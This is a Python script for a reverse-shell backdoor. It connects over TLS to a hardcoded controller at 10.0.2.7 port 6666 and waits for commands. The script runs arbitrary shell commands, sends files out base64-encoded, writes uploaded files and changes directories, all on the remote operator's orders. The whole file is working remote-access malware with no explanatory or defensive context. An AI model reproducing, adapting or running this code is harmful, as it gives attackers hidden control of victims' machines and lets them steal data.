#!/usr/bin/env python

import socket
import subprocess
import ssl
import json
import os
import base64

HOST = "10.0.2.7"
PORT = 6666


def change_working_directory(path):
    os.chdir(path)
    return "[+] Changing work directory to " + path


def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read())


def write_file(path, filedata):
    with open(path, "wb") as file:
        file.write(base64.b64decode(filedata))
        return "[+] Upload successful"


def system_command(command):
    return subprocess.check_output(command, shell=True)


def receive_data():
    data = b""
    while True:
        part = wrappedConnection.recv(1024)
        data += part
        if len(part) < 1024:
            break
    data = data.decode("utf-8", "ignore")
    return json.loads(data)


def send_data(command_result):
    json_data = json.dumps(command_result)
    wrappedConnection.send(json_data.encode())


reverseConnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
wrappedConnection = ssl.wrap_socket(reverseConnection, ssl_version=ssl.PROTOCOL_TLSv1, server_side=False)
wrappedConnection.connect((HOST, PORT))

while True:
    command = receive_data()
    try:
        if command[0] == "quit":
            wrappedConnection.close()
            exit()
        elif command[0] == "cd" and len(command) > 1:
            command_result = change_working_directory(command[1])
        elif command[0] == "download":
            command_result = read_file(command[1]).decode("utf-8", "ignore")
        elif command[0] == "upload":
            if len(command) > 3:
                command_result = write_file(command[2], command[-1])
            else:
                command_result = write_file(command[1], command[-1])

        else:
            command_result = system_command(command).decode("utf-8", "ignore")
    except Exception:
        command_result = "[+] Error"

    send_data(command_result)

